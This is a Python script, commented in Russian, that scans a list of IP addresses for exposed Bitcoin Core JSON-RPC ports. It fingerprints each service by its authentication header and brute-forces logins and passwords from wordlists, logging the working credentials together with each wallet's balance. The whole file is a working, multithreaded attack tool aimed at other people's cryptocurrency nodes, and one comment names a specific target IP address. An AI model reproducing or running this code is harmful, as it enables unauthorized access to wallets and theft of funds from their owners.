#!/usr/bin/python3
#-*- coding: utf-8 -*-

import os
import sys
import json
import socket
import requests
from datetime import datetime
from queue import Queue
from threading import Thread
# custom libraries
from src.file import io

# ======================================================
port = 8332 # порт для bitcoind
timeout = 3 # таймаут соединения

thread_count = 20 # количество потоков для работы
filecleaner = True # Очищать файлы перед запуском?

# log files
ip_file = './log/ip.txt'
login_file = './log/login.txt'
passwd_file = './log/passwords.txt'
good_log = './log/good.log'
bad_log = './log/bad.log'
offline_log = './log/offline.log'
# global variables
q = Queue()
ip_list = []
login_list = []
password_list = []
file = io()
# ======================================================

def check_ballance(response):
    bal = json.loads(response.content)
    #bal = json.dumps(response.json(), indent=4)
    bal = bal["result"]
    bal = str("%.8f" % bal)
    return bal

def get_bal(ip, login, passwd):
    # curl --user login:password --data-binary '{"jsonrpc": "1.0", "id": "curltest", "method": "getbalances", "params": []}' -H 'content-type: text/plain;' http://127.0.0.1:8332/
    url = "http://"+login+":"+passwd+"@"+ip+":"+str(port)
    headers = {'content-type': 'application/json'}
    rpc_input = {"method": "getbalance"}
    rpc_input.update({"jsonrpc": "2.0", "id": "0"})
    try:
        response = requests.post(
            url,
            data=json.dumps(rpc_input),
            headers=headers)
        return response
    except:
        return False

def brute(ip):
    status = True
    for login in login_list:
        if status:
            login = login.strip()
            for password in password_list:
                if status:
                    password = password.strip()
                    response = get_bal(ip, login, password)
                    if response != False:
                        if response.status_code == 200:
                            print(response.content)
                            bal = check_ballance(response)
                            file.writeto(good_log, ip + ', login:'+login+', password: '+password+', ballance:'+bal)
                            status = False

def isOpen(ip):
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.settimeout(timeout)
    try:
        s.connect((ip, port))
        s.shutdown(socket.SHUT_RDWR)
        return True
    except:
        return False
    finally:
        s.close()

def read_header(ip):
    # curl -s -I -X POST http://27.101.156.131:8332/
    # при попадании в разрешенные ip для ответа должно вернуться
    #   HTTP/1.1 401 Unauthorized
    #   {'WWW-Authenticate': 'Basic realm="jsonrpc"', 'Date': 'Mon, 16 Nov 2020 09:33:38 GMT', 'Content-Length': '0', 'Content-Type': 'text/html; charset=ISO-8859-1'}
    payload = {"jsonrpc":"2.0","method":"getbalance","params":[]}
    try:
        response = requests.post("http://"+ip+":"+str(port), data = payload, timeout=3)
    except:
        status = file.writeto(bad_log, ip + ' Failed to connect')
        return False
    
    #  по хорошему надо бы проверять все возможные варианты 500, 401, 400, 200
    if (response.status_code == 401) or (response.status_code == 500) or (response.status_code == 400) or (response.status_code == 200):
        if str(response.headers).find('Basic realm="jsonrpc"') != -1:
            return True
        else:
            status = file.writeto(bad_log, ip+' Unknown service!')
            status = file.writeto(bad_log, response.headers)
            #status = file.writeto(bad_log, response.content)
    else:
        status = file.writeto(bad_log, ip+' Unknown answer!')
        status = file.writeto(bad_log, response.headers)
        #status = file.writeto(bad_log, response.content)
        return False

def task(ip):
    # получаем ip. Чекаем на доступность. Затем чекаем ответ по порту. Затем запускаем брут.
    # проверка на открытый порт.
    ip = ip.strip()
    if isOpen(ip):
        if read_header(ip):
            brute(ip)
    else:
        status = file.writeto(offline_log, str(ip)+' Port Closed')

# очистка от дубликатов
def cleaner(list):
    try:
        list = dict([(item, None) for item in list]).keys()
    except:
        print('Ошибка выборки уникальных значений из списка.')
    return list

# ==================Работа с очередями====================================
# Функция заполняющая очередь заданиями
def put(ip_list):
    for ip in ip_list:
      q.put(ip)

def worker():
    while True:
        # Если заданий нет - закончим цикл
        if q.empty():
            sys.exit()
        # Получаем задание из очереди
        ip = q.get()
        task(str(ip))
        # Сообщаем о выполненном задании
        q.task_done()

#==========================================================================
def main():
    os.system('clear')

    # очищаем файлы перед запуском работы
    if filecleaner:
        now = datetime.now()
        start_sting = now.strftime("%d-%m-%Y %H:%M:%S")
        status = file.rewriteto(good_log, start_sting)
        status = file.rewriteto(bad_log, start_sting)
        status = file.rewriteto(offline_log, start_sting)
    
    # Тут прочитаем файл c ip адресами
    status, ip_list = file.readfrom(ip_file)
    if status == False:
        sys.exit()

    ip_list = cleaner(ip_list)
    print("Загружено "+str(len(ip_list))+" IP адресов.")

    # Тут прочитаем логины и пароли из файлов
    global login_list
    status, login_list = file.readfrom(login_file)
    if status == False:
        sys.exit()

    login_list = cleaner(login_list)
    print("Загружено "+str(len(login_list))+" логин(ов).")

    global password_list
    status, password_list = file.readfrom(passwd_file)
    if status == False:
        sys.exit()

    password_list = cleaner(password_list)
    print("Загружено "+str(len(password_list))+" паролей.")

    # Тут наполним заданиями очередь
    put(ip_list)

    # Запускаем потоки в работу
    for x in range(1,thread_count+1):    
        if not q.empty():
            Thread(target=worker).start()

# def starter
if __name__ == '__main__':
  main()